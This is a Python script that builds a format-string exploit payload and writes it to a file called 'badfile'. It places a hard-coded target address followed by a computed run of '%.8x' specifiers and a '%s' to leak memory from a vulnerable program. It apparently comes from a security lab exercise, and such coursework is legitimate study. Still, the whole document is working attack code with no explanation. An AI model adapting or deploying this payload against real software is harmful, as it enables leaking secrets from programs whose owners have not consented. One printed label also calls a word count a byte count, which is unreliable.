#! /usr/bin/python3

EBP = 0xffffd658
INP = 0xffffd730

def main():
    # Initialize the content array
    N = 1500
    content = bytearray(0x0 for i in range(N))

    secret_addr  = 0x080b4008
    content[0:4]  =  (secret_addr).to_bytes(4,byteorder='little')
    distance = abs(INP - EBP) // 4
    print("The difference between the addresses of the frame pointer and the address of the input buffer (in bytes) is", distance)
    offset = 9
    distance = distance + offset
    print("The number of %x is", distance)
    s = "%.8x " * distance + "%s\n"
    fmt  = (s).encode('latin-1')
    content[4:4+len(fmt)] = fmt

    # Write the content to badfile
    with open('badfile', 'wb') as f:
        f.write(content)

if __name__ == "__main__":
  main()